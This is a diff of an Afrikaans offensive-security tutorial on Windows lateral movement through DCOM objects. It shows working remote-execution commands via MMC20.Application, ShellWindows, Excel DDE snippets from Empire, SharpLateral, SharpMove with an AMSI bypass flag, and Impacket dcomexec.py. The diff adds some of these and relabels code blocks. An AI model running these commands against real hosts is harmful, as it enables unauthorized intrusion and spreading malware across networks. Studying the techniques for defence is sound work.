@@ -10,21 +10,21 @@ Distributed Component Object Model (DCOM) objekke bied 'n interessante vermoë v
 ```bash
 Get-CimInstance Win32_DCOMApplication
 ```
-Die COM objek, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), stel die skripting van MMC snap-in operasies in staat. Opmerklik is dat hierdie objek 'n `ExecuteShellCommand` metode onder `Document.ActiveView` bevat. Meer inligting oor hierdie metode kan [hier](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>) gevind word. Kontroleer dit wat dit uitvoer:
+Die COM objek, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), stel die skripting van MMC snap-in operasies in staat. Opmerklik, hierdie objek bevat 'n `ExecuteShellCommand` metode onder `Document.ActiveView`. Meer inligting oor hierdie metode kan [hier](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>) gevind word. Kontroleer dit wat dit uitvoer:
 
 Hierdie funksie fasiliteer die uitvoering van opdragte oor 'n netwerk deur 'n DCOM toepassing. Om met DCOM op afstand as 'n admin te kommunikeer, kan PowerShell soos volg gebruik word:
-```powershell
+```bash
 [activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
 ```
 Hierdie opdrag maak verbinding met die DCOM-toepassing en keer 'n instansie van die COM-objek terug. Die ExecuteShellCommand-metode kan dan aangeroep word om 'n proses op die afstandsbediener uit te voer. Die proses behels die volgende stappe:
 
 Kontroleer metodes:
-```powershell
+```bash
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
 $com.Document.ActiveView | Get-Member
 ```
 Kry RCE:
-```powershell
+```bash
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
 $com | Get-Member
 
@@ -45,18 +45,23 @@ Twee spesifieke objekte, `ShellBrowserWindow` en `ShellWindows`, is beklemtoon w
 Vir `ShellWindows`, wat 'n ProgID ontbreek, fasiliteer die .NET metodes `Type.GetTypeFromCLSID` en `Activator.CreateInstance` objekinstansie met behulp van sy AppID. Hierdie proses benut OleView .NET om die CLSID vir `ShellWindows` te verkry. Sodra dit geïnstantieer is, is interaksie moontlik deur die `WindowsShell.Item` metode, wat lei tot metode-aanroep soos `Document.Application.ShellExecute`.
 
 Voorbeeld PowerShell-opdragte is verskaf om die objek te instansieer en opdragte op afstand uit te voer:
-```powershell
+```bash
+# Example
 $com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
 $obj = [System.Activator]::CreateInstance($com)
 $item = $obj.Item()
 $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
+
+# Need to upload the file to execute
+$COM = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.APPLICATION", "192.168.52.100"))
+$COM.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\calc.exe", $Null, $Null, "7")
 ```
-### Laterale Beweging met Excel DCOM-objekte
+### Laterale Beweging met Excel DCOM Objekte
 
-Laterale beweging kan bereik word deur DCOM Excel-objekte te benut. Vir gedetailleerde inligting is dit raadsaam om die bespreking oor die benutting van Excel DDE vir laterale beweging via DCOM op [Cybereason se blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) te lees.
+Laterale beweging kan bereik word deur DCOM Excel objekte te benut. Vir gedetailleerde inligting, is dit raadsaam om die bespreking oor die benutting van Excel DDE vir laterale beweging via DCOM op [Cybereason se blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) te lees.
 
-Die Empire-projek bied 'n PowerShell-skrip, wat die gebruik van Excel vir afstandkode-uitvoering (RCE) demonstreer deur DCOM-objekte te manipuleer. Hieronder is snitte van die skrip beskikbaar op [Empire se GitHub-bewaarplek](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), wat verskillende metodes toon om Excel vir RCE te misbruik:
-```powershell
+Die Empire-projek bied 'n PowerShell-skrip, wat die gebruik van Excel vir afstandkode-uitvoering (RCE) demonstreer deur DCOM objekte te manipuleer. Hieronder is snitte uit die skrip beskikbaar op [Empire se GitHub-bewaarplek](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), wat verskillende metodes toon om Excel vir RCE te misbruik:
+```bash
 # Detection of Office version
 elseif ($Method -Match "DetectOffice") {
 $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
@@ -80,7 +85,7 @@ $Obj.DDEInitiate("cmd", "/c $Command")
 ```
 ### Outomatiseringstoestelle vir Laterale Beweging
 
-Twee gereedskap word beklemtoon om hierdie tegnieke te outomatiseer:
+Twee gereedskap word beklemtoon vir die outomatisering van hierdie tegnieke:
 
 - **Invoke-DCOM.ps1**: 'n PowerShell-skrip wat deur die Empire-projek verskaf word en die oproep van verskillende metodes vir die uitvoering van kode op afstandmasjiene vereenvoudig. Hierdie skrip is beskikbaar by die Empire GitHub-bewaarplek.
 
@@ -88,12 +93,24 @@ Twee gereedskap word beklemtoon om hierdie tegnieke te outomatiseer:
 ```bash
 SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 ```
+- [SharpMove](https://github.com/0xthirteen/SharpMove):
+```bash
+SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
+```
 ## Outomatiese Gereedskap
 
 - Die Powershell-skrip [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) maak dit maklik om al die kommentaar maniere te aktiveer om kode op ander masjiene uit te voer.
+- Jy kan Impacket se `dcomexec.py` gebruik om op afstandsisteme opdragte uit te voer met DCOM.
+```bash
+dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"
+```
 - Jy kan ook [**SharpLateral**](https://github.com/mertdas/SharpLateral) gebruik:
 ```bash
 SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
+```
+- Jy kan ook [**SharpMove**](https://github.com/0xthirteen/SharpMove) gebruik.
+```bash
+SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
 ```
 ## Verwysings
 
